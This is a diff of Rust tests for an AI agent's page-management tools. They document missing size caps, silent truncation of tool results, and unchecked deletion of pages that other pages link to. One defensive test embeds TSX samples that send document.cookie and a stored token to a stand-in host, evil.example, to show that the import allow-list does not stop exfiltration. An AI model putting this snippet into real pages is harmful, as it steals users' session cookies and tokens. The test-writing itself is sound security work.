@@ -1526,4 +1526,196 @@ export * from "https://evil.example/x.js";
         assert!(!valid_slug("revenue/../secrets"));
         assert!(!valid_slug("revenue overview"));
     }
+
+    // -- FAIL-axis: unbounded growth, oversized source, ambient globals ------
+
+    fn node(id: &str, name: &str, kind: NodeKind, parent: Option<&str>) -> WorkspaceNode {
+        WorkspaceNode {
+            id: id.to_string(),
+            name: name.to_string(),
+            kind,
+            parent_id: parent.map(str::to_string),
+            updated_at_millis: 1_000,
+            created_by: WorkspaceOrigin::Operator,
+            updated_by: WorkspaceOrigin::Operator,
+            mime: None,
+            size: None,
+            sha256: None,
+            adopted: false,
+        }
+    }
+
+    /// FAIL-axis (HT-040): `pages_list` renders one line per page with no entry
+    /// cap and no byte budget — unlike `workspace_list`, which stops on both.
+    /// A company that accumulates pages therefore produces a result the harness
+    /// cuts, and the cut lands on the entries with nothing saying so, so the
+    /// agent reads a short list as the complete list.
+    #[tokio::test]
+    #[ignore = "pages_list has no entry or byte cap: a large company overflows the tool-result budget"]
+    async fn pages_list_stays_within_the_tool_result_budget_when_a_company_has_many_pages() {
+        let (_dir, store) = store().await;
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
+                None,
+            )
+            .await
+            .expect("pages root");
+        for n in 0..400 {
+            store
+                .create(
+                    &company,
+                    &node(
+                        &format!("page-{n:03}"),
+                        &format!("quarterly-revenue-overview-region-{n:03}"),
+                        NodeKind::Folder,
+                        Some("pages-root"),
+                    ),
+                    None,
+                )
+                .await
+                .expect("page folder");
+        }
+
+        let list = PagesListTool::new(pages(store, "acme"));
+        let out = list.execute(json!({})).await.unwrap().output();
+        assert!(
+            out.len() <= TOOL_RESULT_BUDGET_BYTES,
+            "pages_list rendered {} bytes, over the {TOOL_RESULT_BUDGET_BYTES}-byte harness \
+             budget — the outer cut fires and silently drops the tail",
+            out.len()
+        );
+    }
+
+    /// FAIL-axis (HT-041): `MAX_SOURCE_BYTES` guards `pages_write`, but
+    /// `pages_read` pushes the stored body out whole with no clamp. A
+    /// `page.tsx` that entered the tree by any other route — an operator's
+    /// console edit, a `workspace_write`, a body written before the cap existed
+    /// — is returned in full and overflows the budget the cap was derived from.
+    #[tokio::test]
+    #[ignore = "pages_read never clamps the source body: an oversized page.tsx overflows the budget"]
+    async fn pages_read_stays_within_the_budget_when_the_stored_source_exceeds_the_cap() {
+        let (_dir, store) = store().await;
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
+                None,
+            )
+            .await
+            .expect("pages root");
+        store
+            .create(
+                &company,
+                &node("slug-big", "big", NodeKind::Folder, Some("pages-root")),
+                None,
+            )
+            .await
+            .expect("slug folder");
+        let oversized = format!("// {}\n", "x".repeat(MAX_SOURCE_BYTES + 8192));
+        store
+            .create(
+                &company,
+                &node("src-big", SOURCE_NAME, NodeKind::File, Some("slug-big")),
+                Some(&oversized),
+            )
+            .await
+            .expect("source");
+
+        let read = PagesReadTool::new(pages(store, "acme"));
+        let out = read.execute(json!({"slug": "big"})).await.unwrap().output();
+        assert!(
+            out.len() <= TOOL_RESULT_BUDGET_BYTES,
+            "pages_read returned {} bytes for a {}-byte source, over the \
+             {TOOL_RESULT_BUDGET_BYTES}-byte budget",
+            out.len(),
+            oversized.len()
+        );
+    }
+
+    /// FAIL-axis (HT-042): the import allow-list is a supply-chain control, not
+    /// a capability sandbox. A page that never imports anything but still calls
+    /// ambient `fetch` and reads `document.cookie` compiles clean — so nothing
+    /// in this module stops exfiltration, and the layer that actually does is
+    /// the served page's CSP (`connect-src 'none'`) plus the opaque-origin
+    /// `allow-scripts`-only iframe. Pinned here so the allow-list is never
+    /// mistaken for the boundary it is not.
+    #[test]
+    fn the_import_allowlist_does_not_constrain_ambient_globals() {
+        const AMBIENT_EXFIL_TSX: &str = r#"
+import * as React from "react";
+
+export default function Page() {
+  fetch("https://evil.example/collect", {
+    method: "POST",
+    body: document.cookie + " " + localStorage.getItem("global_token"),
+  });
+  return <div>ok</div>;
+}
+"#;
+        let compiled = compile_page(AMBIENT_EXFIL_TSX)
+            .expect("ambient globals are not an import, so the allow-list never sees them");
+        assert!(
+            compiled.code.contains("fetch") && compiled.code.contains("document.cookie"),
+            "the call survives compilation untouched: {}",
+            compiled.code
+        );
+
+        // The same exfiltration attempted through an import IS refused — which
+        // is the whole and only scope of this check.
+        let via_import = r#"
+import { send } from "https://evil.example/collect.js";
+export default function Page() { send(document.cookie); return <div/>; }
+"#;
+        let err = compile_page(via_import).expect_err("an import must be refused");
+        assert!(err.contains("https://evil.example"), "{err}");
+
+        for allowed in ALLOWED_IMPORTS {
+            assert!(
+                !allowed.contains("://"),
+                "the allow-list must never admit a remote specifier: {allowed}"
+            );
+        }
+    }
+
+    /// FAIL-axis (HT-043): deletion is permanent and checks nothing. A page
+    /// another page links to can be removed with no warning, leaving a dead
+    /// link in a dashboard nobody edited. The safe answer is to name the
+    /// referrers before destroying the target.
+    #[tokio::test]
+    #[ignore = "pages_delete performs no referential-integrity check against other pages' links"]
+    async fn pages_delete_names_the_pages_that_link_to_the_slug_it_is_about_to_remove() {
+        let (_dir, store) = store().await;
+        let pages = pages(store, "acme");
+        let write = PagesWriteTool::new(pages.clone());
+        write
+            .execute(json!({"slug": "revenue", "title": "Revenue", "source": VALID_TSX}))
+            .await
+            .expect("target page");
+        let linking = r#"
+import * as React from "react";
+
+export default function Page() {
+  return <a href="/pages/revenue">See the revenue dashboard</a>;
+}
+"#;
+        write
+            .execute(json!({"slug": "overview", "title": "Overview", "source": linking}))
+            .await
+            .expect("linking page");
+
+        let delete = PagesDeleteTool::new(pages.clone());
+        let result = delete
+            .execute(json!({"slug": "revenue"}))
+            .await
+            .expect("execute ok");
+        assert!(
+            result.output().contains("overview"),
+            "deleting a linked-to page must name the page that links to it, got: {}",
+            result.output()
+        );
+    }
 }
